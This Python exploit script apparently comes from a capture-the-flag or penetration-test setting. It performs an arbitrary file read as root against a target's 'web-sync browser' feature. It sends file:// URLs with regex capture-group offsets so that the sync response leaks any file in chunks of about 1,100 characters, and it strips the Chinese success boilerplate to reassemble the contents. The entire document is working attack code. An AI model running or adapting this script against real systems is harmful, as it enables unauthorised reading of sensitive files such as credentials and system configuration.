"""Chunked arbitrary-file-read against TARGET_IP (root) via the web-sync browser.

The sync result echoes the regex capture group, up to ~1100 chars per request.
Using `(?s).{OFFSET}(.{1,WINDOW})` we can page through any file.
"""
import sys, time, re
from fileread import read

WINDOW = 1100


def grab(path, offset):
    rx = "(?s).{%d}(.{1,%d})" % (offset, WINDOW)
    st, res, frag = read("file://" + path, rx)
    if not res:
        return None, st, res
    # strip the leading boilerplate: "同步成功 1 条：<name> / " and trailing " / -"
    m = re.match(r"^同步成功\s*\d+\s*条：[^/]*/\s*", res)
    body = res[m.end():] if m else res
    body = re.sub(r"\s*/\s*-\s*$", "", body)
    return body, st, res


def read_all(path, max_chars=20000):
    out = []
    off = 0
    while off < max_chars:
        body, st, res = grab(path, off)
        if body is None:
            # try without offset (start of file) as fallback
            st, res, frag = read("file://" + path, "(?s)(.{1,%d})" % WINDOW)
            m = re.match(r"^同步成功\s*\d+\s*条：[^/]*/\s*", res or "")
            body = (res[m.end():] if m else (res or ""))
            body = re.sub(r"\s*/\s*-\s*$", "", body)
            if not body:
                break
            out.append(body)
            break
        if not body.strip():
            break
        out.append(body)
        if len(body) < WINDOW - 50:
            break
        off += WINDOW
    return "".join(out)


if __name__ == "__main__":
    path = sys.argv[1]
    n = int(sys.argv[2]) if len(sys.argv) > 2 else 4000
    print(read_all(path, n))
